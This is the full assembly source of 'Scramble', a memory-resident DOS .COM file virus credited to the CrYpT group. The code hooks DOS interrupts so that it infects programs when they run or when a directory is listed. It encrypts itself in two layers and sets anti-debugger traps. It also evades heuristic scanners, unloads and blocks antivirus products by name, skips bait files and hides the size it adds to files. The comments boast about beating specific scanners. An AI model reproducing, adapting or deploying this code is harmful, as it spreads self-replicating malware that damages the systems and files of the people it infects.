; SCRAMBLE --- Memory resident .COM infector.               
;
; Uses many methods to slip through heuristic and standard virus scanners.
;
; #1    Pulls MSAV and CPAV out of memory.
; #2    Has self modifying JMP at the beginning to confuse TBAV
; #3    Has the anti-fprot code from YB-X inside.
; #4    Doesn't let many known AV products run.  It doesn't delete them 
;       unlike earlier projects.
; #5    Includes filters in the infection process to exclude possible "bait"
;       files.
; #6    Uses the System File Tables for infection.  This is a beautiful method
;       to get alot of file information quickly.
; #7    Utilizes directory stealth. (FCB only)
;
; Features:  Infects on 11h, 12h, and 4Bh. (Directory and Execute)
;
; Also SCRAMBLE includes many debuggers traps.  They are concentrated in
; the beginning.
;
;                                             Nikademus [CrYpT]
;                                                       ^^^^^^^
;                                                       Smile Urnst....
;
; ********************** [Scramble] ***************************************               
		
		.radix 16
     code       segment
		model  small
		assume cs:code, ds:code, es:code

		org 100h

len             equ offset last - start     ; Shadows length
vir_len         equ len / 16d               ; paragraphs of memory needed
encryptlength   equ (last - begin)/2+1      ; encrypt all but 3 bytes


start:  
		db      0BBh                  ; mov bx, xxxx
off_start:                                    ;
		dw      offset begin          ; this is fixed up during inf.
xor_start:                                    ;             
		db      81h                   ; XOR WORD PTR [BX], ????h
		db      37h                   ;
e_v:                                          ;
		dw      0000h                 ; encryption word
					      ;
		inc     bx                    ;      
		inc     bx                    ;                 
		db      81h, 0FBh             ; cmp bx, xxxx
off_last:                                     ;
		dw      offset last           ;
		jng     xor_start             ;       
begin:                
		jmp     inner_loop
		db      'BEER and TEQUILA forever !' ; I love a good joke...
inner_loop:
start_2:                
		mov     bx, offset begin_2         ; Inner encryption loop
		mov     cx, (last - begin_2)/2+1   ; 
		xor     ax, ax                     ;
		mov     es, ax                     ;
		mov     dx, es:[4*1]               ; Save part of int 3
ax_encrypt:                                        ;
		mov     ax, 0000h                  ; encryption word
encrypt_loop_2:                                    ;
		mov     es:[4*1], cx               ; save cx on part of int 3
		xor     cx, cx                     ; clear cx
		xchg    al, ah                     ; The purpose of this 
		xor     word ptr [bx], ax          ; encryption is to be
		xchg    al, ah                     ; a pain 
		sub     bx, -2                     ; for people wanting to
		mov     cx, es:[4*1]               ; trace.  
		loop    encrypt_loop_2             ; 
begin_2:
		mov     es:[4*1], dx               ; restore int 3
		jmp virus             
		db     '[Scramble] By Nikademus $'
		db     'Read CRYPT Today!. $'
virus:     
		mov     dx, 5945h                ; pull CPAV (MSAV)
		mov     ax, 64001d               ; out of memory
		int     16h                      ; This also confused
						 ; TBCLEAN 
		
		call    bp_fixup                 ; bp fixup 
bp_fixup:                                        ; 
		pop     bp                       ;       
		sub     bp, offset bp_fixup      ;                   

		xor     ax, ax                   ;
		mov     es, ax                   ;
		mov     cx, es:[4*01h+2]         ; Installation Check
		mov     bx, es:[4*03h+2]         ; int 01 and 03 are normally
		cmp     cx, bx                   ; equal.  Shadow changes
		je      next_early               ; int 3h.
		jmp     fix_host                 ;

next_early:
		mov     es:[4*3h], ax            ; 
		mov     es:[4*3h+2], ax          ; zero out 1 and 3
		mov     es:[4*1h], ax            ; Debugger fix...
		mov     es:[4*1h+2], ax          ; We hatesss Debuggersss
						 ; Don't we Preciousss.
						 ;          - Tolkien
	     
		call    screw_fprot              ; confusing f-protect's
		call    screw_fprot              ; heuristic scanning
		call    screw_fprot              ; Still effective as of
		call    screw_fprot              ; version 2.10
		call    screw_fprot              ;
		call    screw_fprot              ; [cf] Crypt Newsletter 18
		call    screw_fprot              ; for explanation & 
		call    screw_fprot              ; rationale
		call    screw_fprot              ;
		call    screw_fprot              ;
Memory_manipulation:
		push    cs                       ;
		pop     es                       ;
		push    cs                       ;
		pop     ds                       ;
		mov     bx,cs                    ; reduce memory size     
		dec     bx                       ;    
		mov     ds,bx                    ; My standard memory  
		cmp     byte ptr ds:[0000],5a    ; routine...   
		jne     fix_host                 ;         
		mov     bx,ds:[0003]             ;   
		sub     bx, 100h                 ; # of 16byte paragraphs      
		mov     ds:0003,bx               ; to grab (4k)
Mov_to_unused_memory:  
		xchg    bx, ax                   ; copy self to the new
		mov     bx, es                   ; 'unused' part of memory    
		add     bx, ax                   ; QEMM calls this area   
		mov     es, bx                   ; unused when Shadow is
		mov     cx, len                  ; resident.
		mov     ax, ds                   ;   
		inc     ax                       ;
		mov     ds, ax                   ;
		lea     si, ds:[offset start+bp] ;          
		lea     di, es:0100              ;   
		rep     movsb                    ;   

Interrupt_Manipulation:                                          
		xor     ax, ax                    
		mov     ds, ax
		push    ds
		lds     ax, ds:[21h*4]            ; get int 21h
		mov     word ptr es:old_21h, ax   ; save 21
		mov     word ptr es:old_21h+2, ds 
		mov     bx, ds                    ; bx = ds
		pop     ds
		mov     word ptr ds:[3h*4], ax    ; put old 21 in int 3h
		mov     word ptr ds:[3h*4+2], bx  ;
		mov     word ptr ds:[21h*4], offset Scramble ; put self in 21 
		mov     ds:[21h*4+2], es                     ;

fix_host:     
		push    cs
		pop     ds
		push    cs
		pop     es
		mov     di,100h                  ; Replace overwritten bytes   
		push    di                       ; Save the 100h
		lea     si, ds:[vict_head + bp]  ;         
		mov     cx, 25d                  ;  
		rep     movsb                    ; Fix 'em
		xor     ax, ax             ; Clean up after myself.
		xor     bx, bx             ;
		xor     dx, dx             ;
		xor     si, si             ;
		xor     di, di             ;
Bye_Bye: 
		ret                        ; Return to 100h
screw_fprot:
		jmp  $ + 2                 ;  Pseudo-nested calls to confuse
		call screw2                ;  f-protect's heuristic
		call screw2                ;  analysis
		call screw2                ;
		call screw2                ;
		call screw2                ;  These are straight from
		ret                        ;  YB-X.
screw2:                                    ;
		jmp  $ + 2                 ;
		call screw3                ;
		call screw3                ;
		call screw3                ;
		call screw3                ;
		call screw3                ;
		ret                        ;
screw3:                                    ;
		jmp  $ + 2                 ;
		call screw4                ;
		call screw4                ;
		call screw4                ;
		call screw4                ;
		call screw4                ;
		ret                        ;
screw4:                                    ;
		jmp  $ + 2                 ;
		ret                        ;

vict_head       db      90h, 0CDh, 20h, 90h, 90h, 90h, 90h, 90h, 90h, 90h
		db      90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h, 90h
		db      90h, 90h, 90h, 90h, 90h
Scramble:                                   
		cmp     ah, 11h                    ; Directory infect.
		je      d_h_1                      ; + Stealth
		cmp     ah, 12h                    ; Directory infect.
		je      d_h_1                      ; + Stealth
		pushf                              ; Save all these      
		push    ax                         ; registers.
		push    bx                         ;
		push    cx                         ;
		push    dx                         ;
		push    si                         ;
		push    di                         ;
		push    ds                         ;
		push    es                         ;
		cmp     ah, 4Bh                    ; Infect + AV filter 
		je      infect                     ;  
notforme:       
		pop     es                         ; Goodbye cruel world
		pop     ds                         ; I'm leaving you today
		pop     di                         ; Goodbye
		pop     si                         ; ..
		pop     dx                         ; Goodbye
		pop     cx                         ; ..
		pop     bx                         ; ...goodbye
		pop     ax                         ;      -Pink Floyd
		popf                               ;  (Well...Close)
		
big_jmp:                
		jmp     dword ptr cs:[old_21h]     ; This is The End.
d_h_1:
		jmp     dir_handler_1
infect:
		mov     word ptr cs:victim_name,dx
		mov     word ptr cs:victim_name+2,ds
		cld                          
		mov     di,dx                
		push    ds
		pop     es                         ; es:di -> name
		mov     al,'.'                     ; find the period
		repne   scasb                      ;
		call    name_tester
		
		cmp     ax, 0CCCCh                 ; DDDDh marks AV
		je      cont_inf                   ;
		jmp     notforme
cont_inf:
		cmp     word ptr es:[di], 'OC'
		jne     notforme
		call    HOOK_24
		mov     ax, 3D00h                  ; open read/only
		lds     dx, cs:[victim_name]       ;
		int     3h                         ;
		jc      notforme                   ; handle errors
		xchg    bx, ax                     ;
		
		call    infection_test             ; is it infected?
		cmp     ax, 0CCCCh                 ; FFFF = infected
		je      continue_inf               ; DDDD = don't infect
		
		mov     byte ptr es:[di+2], 00h    ; mark it read/only
		mov     ax, 3E00h                  ; close file
		int     3h                         ;
		jmp     notforme
continue_inf:
		push    cs                         ; infect 'em
		pop     es                         ;
		call    infect_victim              ;
		jmp     notforme                   ;


infect_victim:                
		mov     ah, 2Ch                    ; get random number 
		int     3h                         ; for encryption 
		or      dx, dx                     ;  
		jz      infect_victim              ;     
write_virus:    
		mov     word ptr [offset e_v], dx  
		mov     word ptr [offset e_value_1], dx
		sub     cx, dx
		mov     word ptr [offset ax_e], cx 
		xchg    cl, ch
		mov     word ptr [offset ax_encrypt+1], cx
		mov     ax, [vict_size]
		push    ax
		mov     si, ax                       ; fix BX offset in head
		add     si, ((offset begin-offset start)+100h) 
		mov     word ptr [off_start], si     ; start of 'cryption 
		push    si
		add     si, len
		mov     word ptr [off_last], si      ; end of 'cryption
		pop     si
		add     si, (offset begin_2 - offset begin)
		mov     word ptr [offset start_2+1], si  ; begin fixup #2
		
		mov     si, offset start             ; copy virus to buffer
		mov     di, offset encryptbuffer     ;
		mov     cx, last-start               ;
		rep     movsb                        ;

		pop     ax
		sub     ax, 3d                           ; construct jump
		mov     word ptr [offset jmp_offset], ax ;
Encryptvirus_in_buffer:                
		push    bx                                     ; inner encryption
		mov     bx, offset encryptbuffer               ;            
		add     bx, (offset begin_2 - offset start)    ;
		mov     cx, (last - begin_2)/2 +1              ; 
e_loop_1:                                                      ;
		db      81h                                  ; XOR [bx]
		db      37h                                  ;  
ax_e:                                                        ;
		dw      0000h                                ; scrambler 
		add     bx, 2                                ;
		loop    e_loop_1                             ; loop
		
		mov     bx, offset encryptbuffer             ;
		add     bx, (offset begin - offset start)    ; outer encryption           
		mov     cx, (last - begin)/2 +1              ; 
e_loop_2:                                                    ;
		db      81h                                  ; XOR [bx]
		db      37h                                  ;  
e_value_1:                                                   ;
		dw      0000h                                ; scrambler 
		add     bx, 2                                ;
		loop    e_loop_2                             ; loop

		pop     bx
		mov     ah, 40h                      ; write virus   
		mov     cx, last-start               ;
		mov     dx, offset encryptbuffer     ;
		int     3h                           ;
		
		mov     ax, 4200h                ; point to front
		xor     cx, cx                   ;
		xor     dx, dx                   ;
		int     3h                       ;
		
		mov     ah, 40h                  ; write jump
		mov     dx, offset jmp_create    ;
		mov     cx, 25d                  ;
		int     3h                       ;

restore_date_time:                                     
		mov     dx, word ptr [date]   ; Date
		mov     cx, word ptr [time]   ; Time
		mov     ax,5701h              ;
		int     3h
fix_attribs:                                   
		mov     ax, 3E00h             ; close
		int     3h                    ;
		mov     ax, 4301h             ; Restore old attributes
		mov     cl, byte ptr [attrib] ;
		lds     dx, cs:victim_name    ;
		int     3h                    ; 
		ret                           ; Leave this sub-routine

dir_handler_1:                
		pushf                 ;
		db      9Ah           ; Call to
old_21h         dd  ?                 ; old int 21 vector

		cmp     al, 0FFh      ; Find something?
		jnz     next_dir_1    ;
		iret                  ;
next_dir_1:
		pushf
		push    ax                         ; save registers.
		push    bx                         ;
		push    cx                         ;
		push    dx                         ;
		push    ds                         ;
		push    es                         ;
		push    si                         ;
		push    di                         ;

		mov     ah, 2Fh                    ; Get DTA
		int     3h                         ; es:bx -> DTA
		push    es                         ;
		pop     ds                         ; ds = es
		cmp     byte ptr [bx], 0FFh        ; Extended FCB?
		jnz     not_extended               ;
		add     bx, 7h                     ;
not_extended:
		push    cs                         ; restore es
		pop     es                         ;
		cld

		lea     di, [victim_name]          ; Dark Angel's code
		lea     si, [bx+1]                 ; to turn FCB string
		mov     cx, 8d                     ; into an ASCIIZ string
space_finder:                
		cmp     byte ptr ds:[si], ' '      ; find the first space
		jz      space_found                ;
		movsb                              ;
		loop    space_finder               ;
space_found:
		mov     al, '.'              ; copy the period
		stosb                        ;
		mov     ax, 'OC'             ; test for (CO)M extention
		lea     si, [bx+9]           ;
		cmp     word ptr [si], ax    ;
		jnz     not_com              ;
		stosw
		mov     al, 'M'              ; Is it an CO(M)
		cmp     byte ptr [si+2], al  ;
		jnz     not_com              ;
		stosb
		mov     al, 0                ; end of string byte
		stosb                        ; NULL for C people
		
		push    ds                  ;
		pop     es                  ;  es = ds
		push    cs                  ;
		pop     ds                  ;  restore ds
		
		xchg    di, bx              ; es:di points to the DTA
		mov     ax, 3D00h           ; open read/only
		lea     dx, [victim_name]   ;
		int     3h                  ; changes to r/w in the
		jc      not_com             ; system file table
		xchg    ax, bx              ;
		
		push    es 
		push    di
		push    ds
		
		call    infection_test             ; is it infected?
		cmp     ax, 0CCCCh                 ; FFFF = infected
		je      continue_dir               ;
		
		mov     byte ptr es:[di+2], 00h    ; mark it read/only
		push    ax
		mov     ax, 3E00h                  ; close file
		int     3h                         ;
		pop     ax                         ; Save these
		pop     ds                         ;
		pop     di                         ;
		pop     es                         ;
		cmp     ax, 0DDDDh                 ; not infected, but
		je      not_com                    ; don't infect. IMPORTANT!
		mov     ax, es:[di+29d]
		sub     ax, len                    ; directory stealth
		mov     es:[di+29d], ax            ;
not_com:                             ;  .         .         .
		pop     di           ;   .       . .       .
		pop     si           ;    .     .   .     .
		pop     es           ;     .   .     .   .
		pop     ds           ;      . .       . .
		pop     dx           ;       .         . 
		pop     cx           ;      . .       . .
		pop     bx           ;     .   .     .   .
		pop     ax           ;    .     .   .     .
		popf                 ;   .       . .       .
		iret                 ;  .         .         .
continue_dir:
		pop     ds             ; Actually get around to infecting
		push    cs             ; the poor little file.
		pop     es             ;
		call   infect_victim   ;
		pop     di             ;
		pop     es             ;
		jmp     not_com        ;
new_24h:        
		mov     al,3                   ; Error (Mis)handler
		iret                           ;
		
name_tester:                
		cmp     word ptr es:[di-3],'MI'    ;Integrity Master
		je      AV                         ;*IM
		
		cmp     word ptr es:[di-3],'XR'    ;*rx
		je      AV                         ;
		
		cmp     word ptr es:[di-3],'PO'    ;*STOP
		jne     next1                      ;(VIRSTOP)
		cmp     word ptr es:[di-5],'TS'    ;
		je      AV                         ;

next1:          cmp     word ptr es:[di-3],'VA'    ;*AV  i.e. cpav
		je      AV                         ;(TBAV) (MSAV)  
		
		cmp     word ptr es:[di-3],'TO'    ;*prot  f-prot
		jne     next2                      ;
		cmp     word ptr es:[di-5],'RP'    ;
		jne     next2                      ;  
AV:             jmp     AV_Detected                ; must be equal

next2:          cmp     word ptr es:[di-3],'NA'    ;*scan  McAffee's 
		jne     next3                      ;(TBSCAN)
		cmp     word ptr es:[di-5],'CS'    ;
		je      AV_Detected                ;  
		
		cmp     word ptr es:[di-3],'NA'    ;*lean  CLEAN..
		jne     next3                      ; why not eh?
		cmp     word ptr es:[di-5],'EL'    ;(TBCLEAN)
		je      AV_Detected                ;  

next3:          cmp     word ptr es:[di-3],'CV'    ; Victor Charlie
		je      AV_Detected                ; default  *VC
		
		cmp     word ptr es:[di-3],'KC'    ; VCHECK
		jne     next4                      ; (Victor Charlie)
		cmp     word ptr es:[di-5],'EH'    ; (TBCHECK) *HECK
		je      AV_Detected                ;  
next4:                
		cmp     word ptr es:[di-3],'ME'    ; TBMEM
		jne     next5                      ; *BMEM
		cmp     word ptr es:[di-5],'MB'    ; 
		je      AV_Detected                ;  
next5:                
		cmp     word ptr es:[di-3],'XN'    ; TBSCANX
		jne     next6                      ; *CANX
		cmp     word ptr es:[di-5],'AC'    ; 
		je      AV_Detected                ;  
next6:                
		cmp     word ptr es:[di-3],'EL'    ; TBFILE
		jne     next7                      ; *FILE
		cmp     word ptr es:[di-5],'IF'    ; 
		je      AV_Detected                ;  
next7:                
		cmp     word ptr es:[di-3],'KS'    ; CHKDSK
		jne     next8                      ; *KDSK
		cmp     word ptr es:[di-5],'DK'    ; chkdsk finds false errors
		je      AV_Detected                ; with directory stealth 
next8:                
		mov     ax, 0CCCCh                   ; Flag NON-AV
		ret                                  ;
AV_Detected:      
		mov     word ptr es:[di-1], 2020h    ; Screw up the search
		mov     word ptr es:[di+1], 2020h    ; clear the .XXX
		mov     ax, 0DDDDh                   ; Flag AV
		ret                                  ;

HOOK_24:                                           ; hook interrupt 24
		push    ds                         ; by direct writes to 
		push    dx                         ; the
		push    ax                         ; interrupt vector
		push    es                         ; table
		xor     ax, ax                     ; 
		mov     ds, ax                     ; DOS will fix it back
		mov     dx, offset new_24h         ; all by itself.
		mov     word ptr ds:[24h*4], dx    ;  For once, I like what
		mov     word ptr ds:[24h*4+2], es  ;  DOS does.
		pop     es                         ;
		pop     ax                         ;
		pop     dx                         ;
		pop     ds                         ;
		ret                                ;

infection_test:                                    ; assume file 
		push    cs                         ; open
		pop     es                         ; and bx is handle
		push    cs
		pop     ds
		
		push    bx                         ;
		mov     ax, 1220h                  ; Get Job File Table
		int     2Fh                        ;
		jc      error_out                  ;
		mov     bl, es:di                  ;
		mov     ax, 1216h                  ; Get System File Table
		int     2Fh                        ; For my file.
		jc      error_out                  ;

		pop     bx
		mov     byte ptr es:[di+2], 02h    ; change to read/write
		mov     ax, word ptr es:[di + 0Dh] ; get time
		mov     cs:[time], ax              ;
		mov     ax, word ptr es:[di + 0Fh] ; get date
		mov     cs:[date], ax              ;
		mov     al, byte ptr es:[di + 04h] ; get attribs
		mov     cs:[attrib], al            ;
		mov     ax, es:[di + 11h]
		cmp     ax, 1000d                  ; size filter
		jb      filter_error               ; only infect files bigger
		
		mov     ax, 3F00h                  ; read in 25 bytes
		mov     cx, 25d                    ;
		mov     dx, offset vict_head       ;
		int     3h                         ;
		jc      error_out                  ;
		
		; Looking for possible BAIT files.

		mov     ah, byte ptr cs:[vict_head]     ;
		cmp     ah, 90h                         ; nop test
		je      filter_error                    ;
		cmp     ah, 0CDh                        ; INT test
		je      filter_error                    ;
		mov     ax, word ptr cs:[vict_head+1]   ;
		cmp     ah, 0CDh                        ; INT test
		je      filter_error                    ;
		cmp     al, 0CDh                        ; INT test
		je      filter_error                    ;
		mov     ax, 4200h    ; point to beginning
		xor     cx, cx       ; could have used SFT
		xor     dx, dx       ;
		int     3h           ;
		mov     ax, 4202h    ; point to end
		int     3h           ;
		
		mov     cs:[vict_size], ax            ; infection check
		mov     cx, word ptr cs:[vict_head]   ; 
		mov     ax, 0CCBAh                    ; me..
		cmp     ax, cx                        ;
		jnz     not_infected                  ;
error_out:                
		mov     ax, 0FFFFh                    ; FF = infected
		ret                                   ;
filter_error:
		mov     ax, 0DDDDh                    ; not infected
		ret                                   ; and DONT infect
not_infected:
		mov     ax, 0CCCCh                    ; not infected
		ret

jmp_create      db      0BAh, 0CCh, 0CCh, 0C6h, 06h, 00h, 01h, 0E9h, 0B8h      
		db      2Eh, 01h, 0BBh, 01h, 01h, 2Dh, 03h, 01h, 33h, 0C1h 
		db      0C7h, 07h
jmp_offset      db      2Bh, 00h
		db      0EBh, 0E7h
last:                                      ; -=< end of encryption. >=-



; The heap........   junk not needed in main program

date            dw  00h, 00h              
victim_name     dd  ?
time            dw  00h, 00h     
attrib          db  ?
vict_size       dw  00h, 00h

encryptbuffer   db       (last-start)+1 dup (?)
code            ends
		end start



